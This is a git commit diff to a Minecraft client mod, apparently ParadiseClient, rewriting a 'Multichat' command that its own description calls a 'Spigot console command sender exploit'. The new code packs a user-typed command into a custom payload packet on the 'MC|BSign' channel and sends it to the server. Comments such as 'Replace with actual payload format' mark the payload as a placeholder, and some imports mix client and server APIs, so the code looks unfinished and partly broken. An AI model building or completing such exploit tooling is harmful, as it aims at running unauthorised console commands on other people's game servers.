c69f9852eb47ad2e7ed5634dae10cdf2a9bc02c0
McpeDX <164185653+McpeDX@users.noreply.github.com>
2025-06-04 08:59:52 +0530

    Update Multichat.java

--- src/main/java/io/github/spigotrce/paradiseclientfabric/command/impl/Multichat.java
+++ src/main/java/io/github/spigotrce/paradiseclientfabric/command/impl/Multichat.java
@@ -1,32 +1,55 @@
 package io.github.spigotrce.paradiseclientfabric.command.impl;
 
-import com.mojang.brigadier.arguments.ArgumentType;
 import com.mojang.brigadier.arguments.StringArgumentType;
 import com.mojang.brigadier.builder.LiteralArgumentBuilder;
 import com.mojang.brigadier.context.CommandContext;
 import io.github.spigotrce.paradiseclientfabric.Helper;
-import net.minecraft.CommandSource;
-import net.minecraft.Packet;
-import net.minecraft.CustomPayloadC2SPacket;
-import net.minecraft.MinecraftClient;
-import net.minecraft.CustomPayload;
+import net.minecraft.client.MinecraftClient;
+import net.minecraft.client.network.ClientCommandSource;
+import net.minecraft.network.PacketByteBuf;
+import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
+import net.minecraft.util.Identifier;
+import net.minecraft.util.registry.Registry;
+import net.minecraft.command.CommandSource;
+import net.minecraft.command.argument.ArgumentTypes;
+
+import static net.minecraft.server.command.CommandManager.literal;
+import static net.minecraft.server.command.CommandManager.argument;
+
+import io.github.spigotrce.paradiseclientfabric.command.Command;
+import io.netty.buffer.Unpooled;
 
 public class Multichat extends Command {
+
     public Multichat(MinecraftClient minecraftClient) {
         super("multichat", "Spigot console command sender exploit", minecraftClient);
     }
 
     @Override
-    public LiteralArgumentBuilder<CommandSource> build() {
-        return (MultiChat.literal(this.getName()).executes(this::build)).then(MultiChat.argument("command", StringArgumentType.greedyString()).executes(context -> {
-            Helper.sendPacket(new CustomPayloadC2SPacket(new MultichatWriter(context.getArgument("command", String.class))));
-            Helper.printChatMessage("Payload sent!");
-            return 1;
-        }));
+    public LiteralArgumentBuilder<ClientCommandSource> build() {
+        return literal(this.getName())
+            .executes(this::onEmpty)
+            .then(argument("command", StringArgumentType.greedyString())
+                .executes(this::sendPayload));
     }
 
-    private int build(CommandContext<?> context) {
-        Helper.printChatMessage("Incomplete command!");
+    private int onEmpty(CommandContext<ClientCommandSource> context) {
+        Helper.printChatMessage("Usage: .multichat <command>");
         return 1;
     }
-                                                                             }
+
+    private int sendPayload(CommandContext<ClientCommandSource> context) {
+        String command = context.getArgument("command", String.class);
+        PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
+
+        // Replace with actual payload format
+        buf.writeString(command);
+
+        Identifier channel = new Identifier("MC|BSign"); // Example custom channel
+        CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(channel, buf);
+        Helper.sendPacket(packet);
+
+        Helper.printChatMessage("Payload sent!");
+        return 1;
+    }
+}
